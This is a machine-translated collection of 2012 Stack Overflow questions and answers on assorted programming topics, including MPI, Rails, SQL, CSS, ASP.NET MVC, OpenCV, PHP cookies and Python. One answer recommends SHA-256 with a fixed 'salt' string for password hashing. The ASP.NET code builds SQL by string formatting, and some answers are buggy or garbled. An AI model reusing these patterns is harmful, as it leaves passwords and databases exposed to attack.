MPI_Type_commit(&one_d);

/* new middle dimenson is K items, strided over the K row, which isn't
 * actually a stride in this case.  We use hvector here because we 
 * operate directly in terms of array items */
MPI_Type_create_hvector(dim_sizes[2], 1, sizeof(double), one_d, &two_d);
MPI_Type_commit(&two_d);

/* new outermost dimension is J items, strided over the old J row */
MPI_Type_create_hvector(dim_sizes[1], 1, dim_sizes[2]*sizeof(double), two_d,
    &transposed_type);
MPI_Type_commit(&transposed_type); 
```

现在，您可以提供`transposed_type`给您的发送/接收呼叫或使其成为您的 MPI 文件视图。

# objective-c - 推送其他viewcontroller时隐藏uisearchdisplaycontroller的导航栏

> ID：13093306
> 
> 赞同：2
> 
> 时间：2012-10-26T19:37:15.133
> 
> 标签：objective-c, ios, uisearchdisplaycontroller

我有一个带有 uisearchdisplay 控制器的 uitableviewcontroller。点击表格单元格会推送另一个包含一些内容的视图，并在推送的视图控制器中隐藏导航栏。视图控制器有它自己的 uitoolbar，到目前为止一切正常。问题是，当显示搜索结果然后点击表格单元格视图时，会推动带有 uitoolbar 的视图控制器，其上方有一个导航栏。所以推视图上有两个栏。我不想隐藏导航栏。如果未从搜索结果中推送视图控制器，则此代码有效

```
[self.navigationController setNavigationBarHidden:YES animated:YES]; 
```

我在使用 uisearchdisplay 控制器并在推送其他视图时隐藏其导航栏时缺少什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-05T11:23:33.920

I have redesigned my app. i dont use uisearchdisplay controller. instead i use uisearchbar and tableview which works perfectly.

# c++ - 是否有一组 Objective-C 包装器来提升库？

> ID：13093307
> 
> 赞同：2
> 
> 时间：2012-10-26T19:37:17.097
> 
> 标签：c++, objective-c, boost

在 Cocoa 项目中使用 boost.org 并不复杂。我正在使用此处描述的不透明指针： [我可以在编译和链接时将 C++ 主函数和类与 Objective-C 和/或 C 例程分开吗？](https://stackoverflow.com/questions/2226912/can-i-separate-c-main-function-and-classes-from-objective-c-and-or-c-routines)

所以我围绕我正在使用的boost库（Graph，Spirit，...）编写了一些Objective-C包装器，以便在我的程序中保持一致的风格（并避免污染我的所有项目，使其最终成为完全客观的-C++)

在继续之前，我想知道这样的包装器是否已经存在（作为一个开源项目）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T13:24:44.933

没有现成的包装 AFAIK ......也许这有帮助：

boostoniphone： [https ://github.com/root42/boostoniphone-with-objc-nil-fix](https://github.com/root42/boostoniphone-with-objc-nil-fix)

# node.js - 在 Nodejs 中生成 API 密钥和哈希密码的最佳方法是什么？

> ID：13093308
> 
> 赞同：7
> 
> 时间：2012-10-26T19:37:19.207
> 
> 标签：node.js

我正在使用自己的身份验证，有点担心我的 API 的当前安全性。您认为生成 API 密钥的好方法是什么？什么是散列密码的更好方法？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-10-26T21:03:17.853

对于 api 密钥，我建议您使用 node-uuid。用于散列密码 - 内置加密。对于 api 机密，您还可以结合使用 node-uuid + crypto。类似的东西（节点repl）：

```
> require('node-uuid')()
'5d2962e4-55c8-460c-aa7b-9586905779cb'
> require('crypto').createHash('sha256').update(_).update('salt').digest('hex');
'06f905820cafb3b34bd7ba8729acf6d671446ff09ffb0aaa7f0290c936fc6c68' 
```

# ruby-on-rails - 从数据库检索值后触发的rails活动记录回调

> ID：13093310
> 
> 赞同：2
> 
> 时间：2012-10-26T19:37:39.507
> 
> 标签：ruby-on-rails

是否有一个活动记录回调可以让我在某些数据库字段的值被检索后立即设置一个非数据库字段？我需要在数据库检索后执行此操作，因为我需要为非 db 字段计算值。

我也欢迎其他方式来做到这一点。具体来说，我有一个非 db 的 days_ago 字段，然后我只想在 created_at 可用后创建它，并且我必须在模型类中执行此操作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T20:16:26.110

You should use `after_find`:

```
after_find :set_days_ago

def set_days_ago
  self.days_ago = DateTime.now - self.created_at.to_datetime if self.created_at
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T20:10:37.423

听起来您可能想要一个“延迟加载”`days_ago`字段。您应该只`days_ago`在实际需要时计算该值，方法是在您的模型中添加这样的方法：

```
def days_ago
  return nil unless created_at?
  @days_ago ||= ... # (calculation involving created_at)
end 
```

第一次调用时`days_ago`，它会计算值，并将值缓存在`@days_ago`变量中。第二次调用它，它会返回缓存的值。

# sql - SQL - Where 子句：将列与多个值进行比较

> ID：13093312
> 
> 赞同：2
> 
> 时间：2012-10-26T19:37:59.417
> 
> 标签：sql

是否有任何通用命令或语法`SQL`允许在 where 语句中有多个值而不使用`OR`？ `OR`当您有许多值可供选择并且您只想说其中的一半时，就会变得乏味。我只想返回包含某些值的列。我正在使用`Cache SQL`，但正如我所说，通用语法也可能会有所帮助，因为大多数人都不熟悉`Cache SQL`. 谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-26T19:39:08.670

你应该使用`IN`：

```
... where column_name in ('val1', 'val2', ...); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T19:39:36.050

使用“IN”子句。

```
SELECT * FROM product WHERE productid IN (1,2,3) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:39:43.857

我相信您正在寻找该[`IN`条款](http://msdn.microsoft.com/en-us/library/ms177682.aspx)。

> 确定指定值是否与子查询或列表中的任何值匹配。

# sql - sql数据检索问题

> ID：13093323
> 
> 赞同：0
> 
> 时间：2012-10-26T19:38:39.260
> 
> 标签：sql, oracle, plsql

我有下表：

**命令**

```
Order_id     orde_number    Order_name  

1             12345          iphone

2             67891          samsung 
```

**order_event**

```
order_event_no      status

1                    D

1                    C

2                    C 
```

我写了下面的查询来检索`status not in ('D')`如下，但它给了我 2 条记录，但查询不应该返回，因为`order_no`1 已经作为状态`D`，即使它有第二条记录 C 它不应该包括在内。

```
select o.order_number,o.order_name 
  from order o 
  join order_event oe 
    on (o.order_id=oe.order_event_no) where oe.status not in ('D') 
```

问候，柴图

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:43:37.483

这将使用给定的架构/数据完成您想要的...

```
SELECT order_number, order_name
FROM order
WHERE order_id NOT IN (SELECT order_event_no FROM order_event WHERE status = 'D') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:44:59.533

如果您想排除任何状态为“D”的订单，您需要一个子查询。

```
select o.order_number,o.order_name 
from order o 
where oe.order_event_no 
NOT IN
    (SELECT order_event_no FROM order_event_no WHERE status = 'D') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:52:44.047

这是等价的。一些 RDBM 会更快地执行它：

```
Select
  o.order_number,
  o.order_name
from
  order o
where
  not exists (
    select
      'x'
    from
      order_event oe
    where
      oe.order_event_no = o.order_id And
      oe.status = 'D'
  ); 
```

# html - 带有过渡的图像上的 Chrome 插入框阴影不起作用

> ID：13093324
> 
> 赞同：1
> 
> 时间：2012-10-26T19:38:55.043
> 
> 标签：html, google-chrome, transition, css

我试图在图像链接上放一个小插图，当悬停在消散时。我正在使用的当前代码在 Firefox 中运行良好，但在 chrome 中，过渡效果无法运行。

如果您要删除缩略图，则背景具有相同的效果并会在其上显示过渡。

这是一个错误吗？

```
<article>
                <div class="thumbnail">
                    <a href="#"><img src="images/download.jpg" alt="" /></a>
                </div>
                <div class="article-text">
                    <h3>Article Header</h3>
                    <div class="author">
                        Author Name here.  Date Posted Here.
                    </div>
                    <p>Lorem ipsum</p>
                    <div class="meta">
                        <ul class="meta-items">
                            <li>Arbitrary Number</li>
                        </ul>
                        <a class="button" href="#">
                            <span>Read More</span>
                        </a>
                    </div>
                </div>
            </article> 
```

完整的 css/html 可以在 JSfiddle 上看到：http: [//jsfiddle.net/aSTKK/](http://jsfiddle.net/aSTKK/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:06:16.140

不，这不是错误。伪元素上的转换仅在 Firefox 中有效（我个人希望将来能在其他浏览器中看到它们），尽管[有一种方法可以为某些属性模拟它们](http://vimeo.com/51897358)。如果您删除缩略图，您会在元素本身（拥有它时位于图像下方）上看到过渡，而不是在伪元素上。

可能的解决方案：您可以使图像半透明并在悬停时将其不透明度更改为 1（请参阅我不久前做[的示例库](http://dabblet.com/gist/1600113)，尤其是第 3 行第 3 列）。

[像这样](http://jsfiddle.net/thebabydino/aSTKK/2/)的东西（我已将伪元素上的阴影更改为红色以使其更明显）。

相关CSS：

```
.thumbnail {
    width:48%;
    height:200px;
    float:left;
    padding:0;
    background:#37779f;
    box-shadow: inset 0 0 230px 40px rgba(0, 0, 0, 0.5);
    -webkit-transition: 1.3s;
    -moz-transition: 1.3s;
    transition: 1.3s;
    overflow:hidden;
    text-align:center;
}
.thumbnail a{
    position:relative;
    max-width:100%;
    float:left;
}
.thumbnail:hover{
    box-shadow:inset 0 0 115px 20px rgba(0,0,0,0.5);
}
.thumbnail a:after{
    content:'';
    position:absolute;
    top:0;
    bottom:0;
    left:0;
    right:0;
    box-shadow:inset 0 0 115px 20px rgba(255,0,0,1);  
}
.thumbnail img {
    width:100%;
    height:auto;
    opacity: .3;
    -webkit-transition: 1.3s;
    -moz-transition: 1.3s;
    transition: 1.3s;
}
.thumbnail:hover img {   
    opacity: 1;
}​ 
```

# asp.net-mvc - 保存 IEnumerable 模型

> ID：13093325
> 
> 赞同：3
> 
> 时间：2012-10-26T19:38:56.307
> 
> 标签：asp.net-mvc, model, save, enumerable

我有一个有 2 个日期选择器的视图，其中一个是开始日期，另一个是结束日期。我能够让用户选择开始和结束日期，重定向到一个视图，该视图将包含一个工作时间列表，用户可以在其中更改日期、输入时间，一旦完成，他们应该能够单击保存按钮，它应该创建一个每次工作到数据库的新实例。我的视图显示没有问题，但是当表单发布我的可枚举模型为空时，表单集合只有一个可访问的项目，我不知道为什么。请查看我在下面创建的视图，以了解我在做什么，如果您能以任何方式帮助我，请告诉我。

```
@model IEnumerable<TimeCollection.Models.TimeWorked>

@{
    ViewBag.Title = "Create TimeWorked Range";
}

<h2>Create TimeWorked Range</h2>

@using (Html.BeginForm()) {
    @Html.ValidationSummary(true)
<table>
    <tr>
        <th>
            @Html.DisplayNameFor(model => model.WorkDate)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.HoursWorked)
        </th>
    </tr>

@foreach (var item in Model) {
    <tr>
        @Html.HiddenFor(modelItem => item.EmployeeId)
        <td>
            @Html.EditorFor(modelItem => item.WorkDate)
        </td>
        <td>
            @Html.EditorFor(modelItem => item.HoursWorked)
        </td>
        <td>
            @Html.HiddenFor(modelItem => item.BeenSubmitted)
        </td>
    </tr>
}

</table>
    <p>
        <input type="submit" value="Save" />
    </p>
}

using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace TimeCollection.Models
{
    public class TimeWorked
    {
        public int TimeWorkedId { get; set; }
        public int EmployeeId { get; set; }
        public DateTime WorkDate { get; set; }
        public int HoursWorked { get; set; }
        public bool BeenSubmitted { get; set; }

        public static void CreateTimeWorked(TimeWorked timeWorkedToCreate)
        {
            string insertQuery = string.Format("insert into time_worked (employee_id, work_date, work_hours, been_submitted) values ('{0}', '{1}', '{2}', '{3}')", timeWorkedToCreate.EmployeeId, timeWorkedToCreate.WorkDate.ToString("yyyy/MM/dd"), timeWorkedToCreate.HoursWorked, (timeWorkedToCreate.BeenSubmitted == true ? "1" : "0"));
            SpectrumData.Utility.ExecuteMySqlCommand(SpectrumData.Properties.Resources.SpectrumTSDatabaseConnectionString, insertQuery);
        }

        public static TimeWorked ReadTimeWorked(int timeWorkedId)
        {
            string selectQuery = string.Format("select * from time_worked where time_worked_id = '{0}'", timeWorkedId);
            return ConvertDataRowIntoTimeWorked(SpectrumData.Utility.FillDataSet(SpectrumData.Properties.Resources.SpectrumTSDatabaseConnectionString, selectQuery).Tables[0].Rows[0]);
        }

        public static void UpdateTimeWorked(TimeWorked timeWorkedToUpdate)
        {
            string updateQuery = string.Format("update time_worked set work_date = '{0}', work_hours = '{1}', been_submitted = '{2}' where time_worked_id = '{2}'", timeWorkedToUpdate.WorkDate, timeWorkedToUpdate.HoursWorked, timeWorkedToUpdate.BeenSubmitted, timeWorkedToUpdate.TimeWorkedId);
            SpectrumData.Utility.ExecuteMySqlCommand(SpectrumData.Properties.Resources.SpectrumTSDatabaseConnectionString, updateQuery);
        }

        public static void DeleteTimeWorked(int timeWorkedId)
        {
            string deleteQuery = string.Format("delete from time_worked where time_worked_id = '{0}'", timeWorkedId);
            SpectrumData.Utility.ExecuteMySqlCommand(SpectrumData.Properties.Resources.SpectrumTSDatabaseConnectionString, deleteQuery);
        }

        private static TimeWorked ConvertDataRowIntoTimeWorked(System.Data.DataRow timeWorkedDataRow)
        {
            TimeWorked timeWorked = new TimeWorked();
            timeWorked.BeenSubmitted = (timeWorkedDataRow["been_submitted"].ToString() == "1" ? true : false);
            timeWorked.EmployeeId = int.Parse(timeWorkedDataRow["employee_id"].ToString());
            timeWorked.HoursWorked = int.Parse(timeWorkedDataRow["work_hours"].ToString());
            timeWorked.TimeWorkedId = int.Parse(timeWorkedDataRow["time_worked_id"].ToString());
            timeWorked.WorkDate = DateTime.Parse(timeWorkedDataRow["work_date"].ToString());

            return timeWorked;
        }
    }
}

 public ActionResult CreateTimeWorkedRange(DateTime startDate, DateTime endDate)
    {
        List<Models.TimeWorked> listOfTimeWorked = new List<Models.TimeWorked>();
        DateTime beginning = startDate;
        DateTime ending = endDate;

        while (beginning <= ending)
        {
            Models.TimeWorked dayWorked = new Models.TimeWorked()
            {
                EmployeeId = (Session["InventoryReviewUser"] as SpectrumData.SpectrumTS.InventoryReviewUser).EmployeeId,
                WorkDate = beginning
            };

            if (listOfTimeWorked.Contains(dayWorked) == false)
            {
                listOfTimeWorked.Add(dayWorked);
            }

            beginning = beginning.AddDays(1);
        }

        return View(listOfTimeWorked);
    }

    [HttpPost]
    public ActionResult CreateTimeWorkedRange(List<Models.TimeWorked> modelList)
    {
        foreach (Models.TimeWorked timeWorked in modelList)
        {
            Models.TimeWorked.CreateTimeWorked(timeWorked);
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T21:48:57.343

我不知道是否有更好的方法，但一种方法是使用数组的索引绑定您的项目，如下所示：

```
@for (int i = 0; i < Model.Count; ++i) {
    <tr>
        @Html.HiddenFor(modelItem => Model[i].EmployeeId)
        <td>
            @Html.TextBoxFor(modelItem => Model[i].WorkDate)
        </td>
        <td>
            @Html.TextBoxFor(modelItem => Model[i].HoursWorked)
        </td>
        <td>
            @Html.HiddenFor(modelItem => Model[i].BeenSubmitted)
        </td>
    </tr>
} 
```

您的模型需要不同的集合类型（`IList<TimeWorked>`应该没问题）才能使用索引器，但这不应该是我想象的问题。发布时，集合应正确填写。

# winapi - ITaskbarList3 挂钩或替换

> ID：13093331
> 
> 赞同：2
> 
> 时间：2012-10-26T19:39:09.093
> 
> 标签：winapi, windows-7, com, taskbar

我正在尝试创建一个 Windows 7 任务栏替换。内置任务栏有一些我想重新实现的不错的功能，特别是托管在任务栏按钮（[ITaskbarList3](http://msdn.microsoft.com/en-us/library/windows/desktop/dd391698%28v=vs.85%29.aspx)）中的进度条。

由于其他应用程序通过调用获取其接口实例与系统任务栏进行通信，因此`CoCreateInstance(CLSID_TaskbarList, ...)`我需要替换 COM 对象 CLSID_TaskbarList 或设置某种挂钩`ITaskbarList3::SetProgressValue`并`ITaskbarList3::SetProgressState`能够在我自己的窗口上显示进度。任何想法如何做到这一点？

[（和那个](https://stackoverflow.com/questions/6330355/get-itaskbarlist3-data-of-specific-window)不一样）

# android - 使用 OpenCV 进行 Gabor 边缘检测

> ID：13093335
> 
> 赞同：3
> 
> 时间：2012-10-26T19:39:36.893
> 
> 标签：android, image-processing, opencv, matrix

在 OpenCV 中，我检索了一个用于图像处理的 Gabor 内核，它是一个 9:9 矩阵，使用：

`Imgproc.getGaborKernel(...)`

我有一个原始图像的灰色矩阵。（我什至不确定内核应该是图像的大小还是只是一小段，我相当确定小内核）

如何对两者进行卷积并获得卷积的输出？

我正在尝试将 Gabor 小波滤波器放在一起进行边缘检测。

编辑：就矩阵的卷积而言，它看起来像opencv“filter2d”方法是用来做它的，并且可以在Android OpenCV api的Imgproc类中找到。

但是，当我进行卷积并将其放到屏幕上时，它只是一个黑色图像。

```
Size size = new Size(9,9);
Mat gaborKernel = Imgproc.getGaborKernel(size, 3.0, -Math.PI/4, Math.PI, 10.0, Math.PI*0.5, CvType.CV_64F);
Imgproc.filter2D(intermediate, output, -1, gaborKernel);
Bitmap temp = Bitmap.createBitmap(intermediate.cols(), intermediate.rows(), Config.ARGB_8888);
Utils.matToBitmap(output, temp); 
```

我做了一个系统输出来查看这些值，并且所有值都非常小，如下所示。

![Gabor 值逐行](../Images/a0deb82365f84c53257a161479a79b36.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-16T22:24:39.587

你需要标准化你的内核。

只需遍历内核矩阵，计算值的总和。然后再次循环以将每个值除以总和。这可确保您的内核不会改变整体亮度。

# php - 从非 www 重定向到 www 时，PHP 在页面加载时执行两次

> ID：13093337
> 
> 赞同：0
> 
> 时间：2012-10-26T19:39:56.743
> 
> 标签：php, cookies, if-statement

我创建了一个 php 脚本来控制弹出窗口的时间。我只想每 60 秒弹出一次。该脚本在用户第一次访问该页面时设置一个 cookie，然后对于后续访问，该脚本会检查该 cookie，并且仅在 cookie 过期时才激活弹出窗口。弹出窗口由变量 $_SESSION['activate_popup'] 控制。

脚本在所有情况下都按预期工作，但用户第一次访问页面时除外。cookie 是空的，因此它应该在条件 1 中设置 cookie 并激活弹出窗口。相反，它在条件 1 中设置 cookie 并在条件 2 中显示输出。

```
$GLOBALS['popup_output'] .= '<!-- begin popup -->';
$domain = 'brocktonvilla.com';
$expiration = time() + 60;
$time_until_expires = $_COOKIE['rc_popuup2'] - time();
$GLOBALS['popup_output'] .= '<!-- time until expires: ' . $time_until_expires . ' sec -->';

/* 1 */     if ( empty($_COOKIE['rc_popuup2']) ) {                                      // if cookie has not been set
                setcookie('rc_popuup2', $expiration, $expiration, '/', $domain );       // set cookie with value of cookie equals expiration time
                $_SESSION['activate_popup'] = 'yes';                                    // activate the popup
                $GLOBALS['popup_output'] .= '<!-- cookie empty => show popup & set cookie -->';             
            }       
/* 2 */     elseif ( $_COOKIE['rc_popuup2'] > time() ) {                                // cookie has been set and cookie expiration is greater than current time
                $_SESSION['activate_popup'] = 'no';                                     // do not activate popup
                $GLOBALS['popup_output'] .= '<!-- cookie set and not expired => do not show popup -->';
            }
/* 3 */     elseif ( $_COOKIE['rc_popuup2'] < time() ) {                                // cookie has been set and cookie expiration is less than current time
                $_SESSION['activate_popup'] = 'yes';                                    // activate the popup
                setcookie('rc_popuup2', $expiration, $expiration, '/', $domain );       // reset cookie with value of cookie equals expiration time
                $GLOBALS['popup_output'] .= '<!-- cookie set but has expired => show popup & reset cookie -->';
            } 
```

您可以在此处查看运行中的脚本[http://www.brocktonvilla.com/](http://www.brocktonvilla.com/)。搜索源代码“begin popup”，你会看到cookie已经被设置为条件1，并在你第一次访问页面时显示条件2的输出。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T21:31:49.220

事实证明，上述问题是由 PHP 执行两次引起的，一次是用户第一次访问非 www 版本的页面，然后是重定向到 www 版本。

似乎脚本（不可能）同时执行了 if 和 else 语句，但实际上发生的是在第一次传递时未设置 cookie，因此它设置了 cookie（条件 1），然后在第二次传递它读到 cookie 已经设置并且没有过期（条件 2）。这解释了为什么脚本输出在设置 cookie 和生成输出之间有 1-3 秒的时间，正如我对用户 Relentless 提供的尝试解决方案的评论中所见。

为了防止您的 php 脚本运行两次，只需将其包装为以下内容：

```
$domain = $_SERVER['SERVER_NAME'];                                                      
$needle = 'www.';
$pos = strpos($domain, $needle);
if( $pos !== false ) { 
        // your script here     
} 
```

此脚本假定您将对[http://domain.com](http://domain.com)的所有服务器查询重定向到[http://www.domain.com](http://www.domain.com)。如果您改为重定向到非 www，则从条件中删除感叹号（$pos !== false）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:04:47.160

尝试这个：

```
$completed = false;
/* 1 */     if ( empty($_COOKIE['rc_popuup2']) ) {                                      // if cookie has not been set
                setcookie('rc_popuup2', $expiration, $expiration, '/', $domain );       // set cookie with value of cookie equals expiration time
                $_SESSION['activate_popup'] = 'yes';                                    // activate the popup
                $GLOBALS['popup_output'] .= '<!-- cookie empty => show popup & set cookie -->';             
            $completed = true;
            }       
/* 2 */     elseif (( $_COOKIE['rc_popuup2'] > time() ) && ($completed == false)) {                                // cookie has been set and cookie expiration is greater than current time
                $_SESSION['activate_popup'] = 'no';                                     // do not activate popup
                $GLOBALS['popup_output'] .= '<!-- cookie set and not expired => do not show popup -->';
             $completed = true;
            }
/* 3 */     elseif (( $_COOKIE['rc_popuup2'] < time() )  && ($completed == false)) {                                // cookie has been set and cookie expiration is less than current time
                $_SESSION['activate_popup'] = 'yes';                                    // activate the popup
                setcookie('rc_popuup2', $expiration, $expiration, '/', $domain );       // reset cookie with value of cookie equals expiration time
                $GLOBALS['popup_output'] .= '<!-- cookie set but has expired => show popup & reset cookie -->';
            } 
```

# java - 使用struts 2的pixelcone ajax文件上传重定向错误

> ID：13093338
> 
> 赞同：1
> 
> 时间：2012-10-26T19:39:59.133
> 
> 标签：java, jquery, struts2, webcenter

我正在尝试在 struts 2 应用程序中实现[这个插件。](http://pixelcone.com/jquery/ajax-file-upload-script/)我能够将文件发送到服务器，但是当我使用正确的 div 响应操作时，我得到一个空白页面，其中只有当前年份作为内容。在 IE 中我得到：

```
Message: Permission denied
Line: 4
Char: 2462
Code: 0
URI: https://blah.blee.blah.ca/js/jquery/js/jquery-1.7.2.min.js 
```

每当我刷新页面（显示 2012 的页面，我首先单击返回）然后重新加载页面时，我看到该文件在服务器上。

这是我的 JSP 片段

```
<div id="main_container">
   <form action="uploadFile" method="post" enctype="multipart/form-data">
        <input type="file" name="pdffile" class="fileUpload" multiple />
        <button id="px-submit" type="submit">Save</button>
        <button id="px-clear" type="reset">Clear</button>
   </form>
   <script type="text/javascript">
        jQuery(function($) {
            $('.fileUpload').fileUploader({
                limit : 1,
                autoUpload : false,
                selectFileLabel : 'Select',
                buttonUpload : '#px-submit',
                buttonClear : '#px-clear',
                allowedExtension : 'pdf'
            });
        });
    </script>
</div> 
```

支柱2动作：

```
public String uploadFile() {

        String result = Action.ERROR;

        String status = null;

        if (log.isDebugEnabled()) {
            log.debug("doUpload()");
        }

        try {
            showAttachmentDiv = true;
            if (log.isDebugEnabled()) {
                log.debug("doUpload() with filename: '" + this.filename
                        + "' and contentType '" + this.contentType + "'");
                if (uploadedFile != null) {
                    log.debug("doUplaod() with file.getAbsolutePath(): "
                            + uploadedFile.getAbsolutePath());
                } else {
                    log.debug("doUplaod() with file: null ");
                }
            }

            if (uploadedFile != null) {

                if (this.getActionErrors().size() == 0) {
                    AttachmentsUIObject attachment = new AttachmentsUIObject();
                    // the file object is eventually deleted by the fileUpload
                    // utility, so we just copy it.
                    File copiedFile = copyFile(uploadedFile);
                    attachment.setFile(copiedFile);
                    attachment.setType(this.uploadAttachmentType);
                    attachment.setOriginalFilename(this.filename);

                    attachmentsList.add(attachment);

                    // save file code here
                    status = getText(DIV_MESSAGE_UPLOAD_SUCCESS); // on
                                                                    // success
                    // inputStream = new StringBufferInputStream(status);

                } else {
                    uploadedFile.delete();

                    status = getText(DIV_MESSAGE_UPLOAD_FAIL,
                            new String[] { getActionErrors().toString() });

                }

                result = Action.SUCCESS;
            } else {
                addActionError(getText("validation.file.missing"));
                result = Action.INPUT;
            }

        } catch (Exception e) {
            log.error("doUpload()", e);
            addActionError(getText("error.uploadfailed"));

            status = getText(DIV_MESSAGE_UPLOAD_FAIL,
                    new String[] { getText("error.uploadfailed") }); // on

            result = BaseAction.ERROR_UPLOAD;
        }

        inputStream = new StringBufferInputStream(status);

        return result;
    } 
```

struts 2 xml配置：

```
<action name="uploadFile" method="uploadFile" class="xxx.SubmitAction">
     <result name="success" type="stream">
           <param name="contentType">text/html</param>
           <param name="inputName">inputStream</param>
     </result>
</action> 
```

一个重要的注意事项。有甲骨文网络中心。这个 struts 2 应用程序是从门户访问的。这可能与此有关吗？

[jquery-load-throws-permission-denied-error-in-ie](https://stackoverflow.com/questions/1954740/jquery-load-throws-permission-denied-error-in-ie)

# python - 确定一个单词列表是否在一个句子中？

> ID：13093339
> 
> 赞同：2
> 
> 时间：2012-10-26T19:40:06.180
> 
> 标签：python, regex, algorithm, nlp, nltk

有没有一种方法（模式或 Python 或 NLTK 等）来检测一个句子中是否有一个单词列表。

IE

`The cat ran into the hat, box, and house.`| `The list would be hat, box, and house`

这可以是字符串处理的，但我们可能有更通用的列表：

IE

`The cat likes to run outside, run inside, or jump up the stairs.`|

`List=run outside, run inside, or jump up the stairs.`

这可能在段落的中间或句子的末尾，这会使事情变得更加复杂。

我一直在使用 Pattern for python 并且我没有看到解决这个问题的方法，并且很好奇是否有使用模式或 nltk（自然语言工具包）的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T19:48:12.887

根据我从您的问题中得到的信息，我认为您想搜索列表中的所有单词是否都出现在一个句子中。

一般要搜索一个列表元素，在一个句子中，可以使用`all`function。如果其中的所有参数都为真，则返回真。

```
listOfWords = ['word1', 'word2', 'word3', 'two words']
sentence = "word1 as word2 a fword3 af two words"

if all(word in sentence for word in listOfWords):
    print "All words in sentence"
else:
    print "Missing" 
```

**输出**： -

```
"All words in sentence" 
```

我认为这可能符合您的目的。如果没有，那么你可以澄清。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:48:40.793

怎么用`from nltk.tokenize import sent_tokenize`？

```
sent_tokenize("Hello SF Python. This is NLTK.")
["Hello SF Python.", "This is NLTK."] 
```

然后，您可以通过这种方式使用该句子列表：

```
for sentence in my_list:
  # test if this sentence contains the words you want
  # using all() method 
```

更多信息[在这里](http://www.slideshare.net/japerk/nltk-in-20-minutes)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-01-15T16:04:16.787

使用[Trie](https://en.wikipedia.org/wiki/Trie)，您将能够实现 where is `O(n)`where `n`is the number of words in the words 建立一个 trie 与单词列表后，`O(n)`其中是列表中的单词`n`数。

**算法**

*   将句子拆分为由空格分隔的单词列表。
*   对于每个单词，检查它是否在 trie 中有一个键。即该词存在于列表中
    *   如果退出，则将该单词添加到结果中以跟踪列表中出现了多少单词在句子中
    *   跟踪具有 has subtrie 的单词，即当前单词是单词列表中较长单词的前缀
        *   对于这个单词中的每个单词，通过用当前单词扩展它可以看到它可以是单词列表中的一个键或一个 subtrie
    *   如果它是一个 subtrie，那么我们将它添加到 extend_words 列表中，并查看与下一个单词连接是否能够获得完全匹配。

**代码**

```
import pygtrie
listOfWords = ['word1', 'word2', 'word3', 'two words']

trie = pygtrie.StringTrie()
trie._separator = ' '
for word in listOfWords:
  trie[word] = True

print('s', trie._separator)

sentence = "word1 as word2 a fword3 af two words"
sentence_words = sentence.split()
words_found = {}
extended_words = set()

for possible_word in sentence_words:
  has_possible_word = trie.has_node(possible_word)

  if has_possible_word & trie.HAS_VALUE:
    words_found[possible_word] = True

  deep_clone = set(extended_words)
  for extended_word in deep_clone:
    extended_words.remove(extended_word)

    possible_extended_word = extended_word + trie._separator + possible_word
    print(possible_extended_word)
    has_possible_extended_word = trie.has_node(possible_extended_word)

    if has_possible_extended_word & trie.HAS_VALUE:
      words_found[possible_extended_word] = True

    if has_possible_extended_word & trie.HAS_SUBTRIE:
      extended_words.update(possible_extended_word)

  if has_possible_word & trie.HAS_SUBTRIE:
    extended_words.update([possible_word])

print(words_found)
print(len(words_found) == len(listOfWords)) 
```

如果您的单词列表很大并且您不希望每次都对其进行迭代，或者您对同一个单词列表有大量查询，这将非常有用。

[代码在这里](https://repl.it/repls/OrnateDisgustingTwintext)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-26T19:55:25.943

```
all(word in sentence for word in listOfWords) 
```

# eclipse - 你如何在不丢失 svn 历史的情况下从工作副本重建 SVN 存储库

> ID：13093344
> 
> 赞同：0
> 
> 时间：2012-10-26T19:40:19.903
> 
> 标签：eclipse, svn

我的服务提供商更改了 SVN 存储库上的 URL。我们无法从 Eclipse SVN 插件重新连接。根据他们的建议，尝试了 Share Project，它允许我们重定向到新的 URL，但最终搞砸了存储库文件。

在客户端机器上仍然有完整的本地副本和 SVN 状态。有没有办法构建一个新的 SVN 存储库并在 SCN HISTORY 完好无损的情况下加载本地工作副本。当我们使用 Eclipse 插件团队提示执行此操作时，它最终会重新创建项目，但会丢失我们希望保留的原始 SVN 更改历史记录。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:25:06.933

如果我正确理解您的问题，简短的回答是“不”。

SVN 结帐不会将完整的历史记录下载到您的工作站。它只是下载当前状态。当您进行更改时，它会记住下载的内容，以便可以将下载的内容与您现在拥有的内容进行比较。因此，您可以重建“上次修订”和“自上次修订以来的更新”。就是这样。

Eclipse 会跟踪编辑，但我认为它不会在结帐时记住编辑，因为这看起来像一个新文件。无论如何，它有一个有限的缓冲区。

如果您很幸运，您有一个目录，您可以在其中签出修订版 1，然后您保留该目录并将修订版 2 签出到另一个目录等，您可以重建历史记录。但是很少有人这样做，因为这通常是没有意义的，因为历史记录在 SVN 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T04:07:25.640

您无法从工作副本中获取历史记录，因为 WC 始终只是存储库的一部分

如果 SP 只更改了 URL，并且您可以并且知道如何使用纯 CLI SVN 和 WC 作为 FS 中的目录 - 您可以

*   切换或重新定位工作副本

或者

